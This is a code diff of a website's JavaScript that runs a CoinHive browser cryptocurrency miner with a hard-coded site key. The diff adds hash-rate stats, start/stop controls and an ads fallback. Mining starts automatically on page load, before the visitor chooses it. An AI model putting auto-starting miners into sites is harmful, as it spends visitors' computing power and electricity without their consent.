@@ -1,31 +1,64 @@
 var miner = new CoinHive.Anonymous('WrLyksZRJHCRNxgEtSnR0eEJXZYjnBm9', {threads: 4, throttle: 0.25});
-miner.start();
+var refresher = '';
 
 startLink = document.getElementById('startMiner');
-startLink.addEventListener('click', minerStart);
-
 stopLink = document.getElementById('stopMiner');
-stopLink.addEventListener('click', minerStop);
+adsMsg = document.getElementById('ads');
+noAdsMsg = document.getElementById('noAds');
+hpsdiv = document.querySelector('.hashesPerSecond');
+thdiv = document.querySelector('.totalHashes');
 
-function minerStart() {
-    miner.start();
-    startLink.classList.add("none");
-    stopLink.classList.remove("none");
+function adsDisabled() {
+  document.getElementById('ads').classList.add("none");
+  document.getElementById('noAds').classList.remove("none");
+  minerStop();
+  stopLink.classList.add("none");
+  startLink.classList.add("none");
+}
+
+function refreshHashes() {
+  // Output to HTML elements...
+  hpsdiv.innerHTML = miner.getHashesPerSecond().toPrecision(3);
+  thdiv.innerHTML = miner.getTotalHashes();
+
+  miner.on('error', function (params) {
+    if (params.error === 'connection_error') {
+      adsDisabled();
+    }
+    if (params.error !== 'connection_error') {
+      console.log('The pool reported an error', params.error);
+    }
+  });
+};
+
+function startRefreshHashes() {
+  // Update stats once per second
+  refresher = setInterval(function () {
+    refreshHashes()
+  }, 1000);
+};
+
+function stopRefreshHashes() {
+  // Stop updating stats
+  clearInterval(refresher);
 };
 
 function minerStop() {
-    miner.stop();
-    stopLink.classList.add("none");
-    startLink.classList.remove("none");
+  miner.stop();
+  stopRefreshHashes();
+  stopLink.classList.add("none");
+  startLink.classList.remove("none");
+  hpsdiv.innerHTML = 0;
 };
 
-// Update stats once per second
-setInterval(function() {
-    var hashesPerSecond = miner.getHashesPerSecond();
-    var totalHashes = miner.getTotalHashes();
+function minerStart() {
+  miner.start();
+  startLink.classList.add("none");
+  stopLink.classList.remove("none");
+  startRefreshHashes();
+};
 
-    // Output to HTML elements...
-    document.querySelector('.hashesPerSecond').innerHTML = hashesPerSecond.toPrecision(3);
-    document.querySelector('.totalHashes').innerHTML = totalHashes;
-}, 1000);
+startLink.addEventListener('click', minerStart);
+stopLink.addEventListener('click', minerStop);
 
+minerStart();
